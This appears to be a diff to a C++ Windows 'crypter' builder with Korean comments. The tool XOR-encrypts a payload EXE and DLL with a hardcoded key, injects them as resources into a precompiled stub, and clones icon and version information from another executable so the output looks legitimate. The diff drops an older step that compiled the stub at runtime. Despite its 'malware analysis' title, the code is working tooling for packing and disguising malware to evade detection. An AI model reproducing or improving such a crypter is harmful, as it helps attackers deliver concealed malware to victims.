@@ -2,45 +2,13 @@
 #include <fstream>
 #include <vector>
 #include <string>
-#include <sstream>
 #include <windows.h>
-#include <iomanip>
 
 // =================================================================================
-// 리소스에서 Stub 데이터를 로드하는 함수 (새로운 기능)
-// =================================================================================
-std::vector<unsigned char> load_stub_from_resource(const std::string& resource_name) {
-    HMODULE hModule = GetModuleHandle(NULL); // 현재 프로세스(빌더)의 핸들을 가져옵니다.
-    // "BIN" 타입의 리소스를 찾습니다.
-    HRSRC hRes = FindResourceA(hModule, resource_name.c_str(), "BIN");
-    if (!hRes) {
-        std::cerr << "Error: Cannot find resource '" << resource_name << "'." << std::endl;
-        return {};
-    }
-    HGLOBAL hResLoad = LoadResource(hModule, hRes);
-    if (!hResLoad) {
-        std::cerr << "Error: Cannot load resource '" << resource_name << "'." << std::endl;
-        return {};
-    }
-    LPVOID lpResLock = LockResource(hResLoad);
-    if (!lpResLock) {
-        std::cerr << "Error: Cannot lock resource '" << resource_name << "'." << std::endl;
-        return {};
-    }
-    DWORD dwSize = SizeofResource(hModule, hRes);
-    if (dwSize == 0) {
-        return {};
-    }
-    // 리소스 데이터를 vector<unsigned char> 형태로 복사하여 반환합니다.
-    const unsigned char* pData = static_cast<const unsigned char*>(lpResLock);
-    return std::vector<unsigned char>(pData, pData + dwSize);
-}
-
-
-// =================================================================================
-// Builder 로직 시작
+// Builder 로직 시작 (개선된 구조)
 // =================================================================================
 
+// 파일을 벡터로 읽는 함수
 std::vector<unsigned char> read_file(const std::string& filename) {
     std::ifstream file(filename, std::ios::binary | std::ios::ate);
     if (!file) {
@@ -56,6 +24,7 @@ std::vector<unsigned char> read_file(const std::string& filename) {
     return {};
 }
 
+// XOR 암호화 함수
 void xor_crypt(std::vector<unsigned char>& data) {
     const char key[] = "mysecretkey";
     for (size_t i = 0; i < data.size(); ++i) {
@@ -63,15 +32,19 @@ void xor_crypt(std::vector<unsigned char>& data) {
     }
 }
 
-// =================================================================================
-// 리소스 복제 로직 (기존과 동일)
-// =================================================================================
-
+// 리소스 복제 관련 구조체 및 콜백 함수
 struct EnumResInfo {
     HANDLE hUpdate;
 };
 
 BOOL CALLBACK EnumResNameProcA(HMODULE hModule, LPCSTR lpType, LPSTR lpName, LONG_PTR lParam) {
+    // 페이로드 리소스(ID 101, 102)는 복제하지 않도록 예외 처리
+    if (IS_INTRESOURCE(lpType) && (UINT)lpType == (UINT)RT_RCDATA) { // 사용자 정의 데이터 타입인지 확인
+        if (IS_INTRESOURCE(lpName) && ((UINT)lpName == 101 || (UINT)lpName == 102)) {
+            return TRUE; // 건너뛰기
+        }
+    }
+
     EnumResInfo* info = (EnumResInfo*)lParam;
     HRSRC hRes = FindResourceA(hModule, lpName, lpType);
     if (hRes) {
@@ -80,9 +53,7 @@ BOOL CALLBACK EnumResNameProcA(HMODULE hModule, LPCSTR lpType, LPSTR lpName, LON
             LPVOID lpResLock = LockResource(hResLoad);
             if (lpResLock) {
                 DWORD dwSize = SizeofResource(hModule, hRes);
-                if (!UpdateResourceA(info->hUpdate, lpType, lpName, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), lpResLock, dwSize)) {
-                    std::cerr << "Could not update resource. Error: " << GetLastError() << std::endl;
-                }
+                UpdateResourceA(info->hUpdate, lpType, lpName, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), lpResLock, dwSize);
             }
         }
     }
@@ -94,6 +65,7 @@ BOOL CALLBACK EnumResTypeProcA(HMODULE hModule, LPSTR lpType, LONG_PTR lParam) {
     return TRUE;
 }
 
+// 아이콘, 버전 정보 등 일반 리소스를 복제하는 함수
 bool copy_resources(const std::string& source_path, const std::string& dest_path) {
     HMODULE hLib = LoadLibraryExA(source_path.c_str(), NULL, LOAD_LIBRARY_AS_DATAFILE);
     if (!hLib) {
@@ -120,9 +92,7 @@ bool copy_resources(const std::string& source_path, const std::string& dest_path
     return true;
 }
 
-// =================================================================================
-// 페이로드를 리소스로 추가하는 함수 (기존과 동일)
-// =================================================================================
+// 페이로드를 리소스로 주입하는 함수
 bool add_payload_as_resource(const std::string& target_exe, int resource_id, const std::vector<unsigned char>& payload_data) {
     HANDLE hUpdate = BeginUpdateResourceA(target_exe.c_str(), FALSE);
     if (hUpdate == NULL) {
@@ -130,10 +100,10 @@ bool add_payload_as_resource(const std::string& target_exe, int resource_id, con
         return false;
     }
 
-    // "BIN"은 사용자 정의 리소스 타입을 의미합니다.
-    if (!UpdateResourceA(hUpdate, "BIN", MAKEINTRESOURCEA(resource_id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)payload_data.data(), payload_data.size())) {
+    // RT_RCDATA는 일반 바이너리 데이터를 의미하는 표준 리소스 타입입니다.
+    if (!UpdateResourceA(hUpdate, RT_RCDATA, MAKEINTRESOURCEA(resource_id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)payload_data.data(), payload_data.size())) {
         std::cerr << "Error: Could not add resource to file. (Error " << GetLastError() << ")" << std::endl;
-        EndUpdateResourceA(hUpdate, TRUE); // 실패 시 변경 취소
+        EndUpdateResourceA(hUpdate, TRUE);
         return false;
     }
 
@@ -146,22 +116,33 @@ bool add_payload_as_resource(const std::string& target_exe, int resource_id, con
 
 
 int main() {
-    std::string proj_exe, payload_dll, temp_exe, out_path;
+    std::string stub_path, proj_exe, payload_dll, temp_exe, out_path;
 
     SetConsoleTitleA("Malware Analysis and Demonstration Research Crypter");
 
-    std::cout << "--- C++ Crypter For Malware Analysis ---\n";
-    std::cout << "Enter path for my_proj.exe: ";
+    std::cout << "--- C++ Crypter For Malware Analysis (Advanced) ---\n";
+    std::cout << "Enter path for pre-compiled stub.exe: ";
+    std::getline(std::cin, stub_path);
+    std::cout << "Enter path for my_proj.exe (payload): ";
     std::getline(std::cin, proj_exe);
-    std::cout << "Enter path for my_payload.dll: ";
+    std::cout << "Enter path for my_payload.dll (payload): ";
     std::getline(std::cin, payload_dll);
-    std::cout << "Enter path for my_temp.exe (for resources): ";
+    std::cout << "Enter path for my_temp.exe (for icon/version resources): ";
     std::getline(std::cin, temp_exe);
-    std::cout << "Enter output file path (e.g., C:\\path\\to\\Export.exe): ";
+    std::cout << "Enter final output file path (e.g., C:\\path\\to\\Final.exe): ";
     std::getline(std::cin, out_path);
 
-    // 1. 파일 읽기
-    std::cout << "\n[1] Reading payload files...\n";
+    // 1. 최종 출력 경로에 스텁 파일 복사
+    std::cout << "\n[1] Copying stub to output path...\n";
+    if (!CopyFileA(stub_path.c_str(), out_path.c_str(), FALSE)) {
+        std::cerr << "Error: Could not copy stub file. (Error " << GetLastError() << ")\n";
+        system("pause");
+        return 1;
+    }
+    std::cout << "    - Stub copied to " << out_path << "\n";
+
+    // 2. 페이로드 파일 읽기
+    std::cout << "[2] Reading payload files...\n";
     auto exe_bytes = read_file(proj_exe);
     auto dll_bytes = read_file(payload_dll);
 
@@ -173,89 +154,36 @@ int main() {
     std::cout << "    - " << proj_exe << " (" << exe_bytes.size() << " bytes)\n";
     std::cout << "    - " << payload_dll << " (" << dll_bytes.size() << " bytes)\n";
 
-    // 2. 암호화
-    std::cout << "[2] Encrypting payloads...\n";
+    // 3. 페이로드 암호화
+    std::cout << "[3] Encrypting payloads...\n";
     xor_crypt(exe_bytes);
     xor_crypt(dll_bytes);
     std::cout << "    - Encryption complete.\n";
 
-    // 3. 리소스에서 Stub 코드 로드
-    std::cout << "[3] Loading stub from resource...\n";
-    auto stub_bytes = load_stub_from_resource("STUB_PAYLOAD");
-    if (stub_bytes.empty()) {
-        std::cerr << "Failed to load stub payload from resource. Aborting.\n";
-        system("pause");
-        return 1;
-    }
-    std::string stub_code(stub_bytes.begin(), stub_bytes.end());
-    std::cout << "    - Stub loaded successfully (" << stub_bytes.size() << " bytes)\n";
-
-    // 4. Stub 소스 파일 생성
-    std::cout << "[4] Generating stub source file...\n";
-    std::string stub_filename = "_stub_temp.cpp";
-    std::ofstream stub_file(stub_filename);
-    if (!stub_file) {
-        std::cerr << "Error: Could not create temporary stub file.\n";
-        system("pause");
-        return 1;
-    }
-    stub_file << stub_code;
-    stub_file.close();
-    std::cout << "    - Stub source saved to " << stub_filename << "\n";
-
-    // 5. Stub 컴파일
-    std::cout << "[5] Compiling stub (requires cl.exe in PATH)...\n";
-    std::string temp_output_exe = "_temp_export.exe";
-    std::string compile_command = "cl.exe /nologo /O2 /EHsc /Fe" + temp_output_exe + " " + stub_filename + " /link /SUBSYSTEM:WINDOWS";
-
-    int result = system(compile_command.c_str());
-    if (result != 0) {
-        std::cerr << "Error: Compilation failed. Make sure cl.exe is in your PATH.\n";
-        remove(stub_filename.c_str());
-        system("pause");
-        return 1;
-    }
-    std::cout << "    - Stub compiled successfully to " << temp_output_exe << "\n";
-
-    // 임시 소스 파일 삭제
-    remove(stub_filename.c_str());
-
-    // 6. 페이로드를 리소스로 추가
-    std::cout << "[6] Injecting payloads into stub's resources...\n";
-    if (!add_payload_as_resource(temp_output_exe, 101, exe_bytes)) { // EXE_PAYLOAD ID = 101
+    // 4. 암호화된 페이로드를 최종 파일의 리소스로 주입
+    std::cout << "[4] Injecting payloads into final executable's resources...\n";
+    if (!add_payload_as_resource(out_path, 101, exe_bytes)) { // EXE_PAYLOAD ID = 101
         std::cerr << "Error: Failed to inject EXE payload.\n";
-        remove(temp_output_exe.c_str());
         system("pause");
         return 1;
     }
-    if (!add_payload_as_resource(temp_output_exe, 102, dll_bytes)) { // DLL_PAYLOAD ID = 102
+    if (!add_payload_as_resource(out_path, 102, dll_bytes)) { // DLL_PAYLOAD ID = 102
         std::cerr << "Error: Failed to inject DLL payload.\n";
-        remove(temp_output_exe.c_str());
         system("pause");
         return 1;
     }
     std::cout << "    - Payloads injected successfully.\n";
 
-    // 7. 아이콘 등 기존 리소스 복제
-    std::cout << "[7] Cloning resources from " << temp_exe << "...\n";
-    if (!copy_resources(temp_exe, temp_output_exe)) {
+    // 5. 아이콘, 버전 정보 등 기타 리소스 복제
+    std::cout << "[5] Cloning icon and version info...\n";
+    if (!copy_resources(temp_exe, out_path)) {
         std::cerr << "Error: Failed to clone resources.\n";
-        remove(temp_output_exe.c_str());
         system("pause");
         return 1;
     }
     std::cout << "    - Resources cloned successfully.\n";
 
-    // 8. 최종 파일 이동 및 정리
-    std::cout << "[8] Finalizing output file...\n";
-    if (MoveFileExA(temp_output_exe.c_str(), out_path.c_str(), MOVEFILE_REPLACE_EXISTING) == 0) {
-        std::cerr << "Error: Could not move temp file to final destination. Manually move " << temp_output_exe << " to " << out_path << "\n";
-    }
-    else {
-        std::cout << "    - Success! Final file created at: " << out_path << "\n";
-    }
-
-    std::cout << "\nOperation completed.\n";
+    std::cout << "\nOperation completed! Final file created at: " << out_path << "\n";
     system("pause");
 
     return 0;
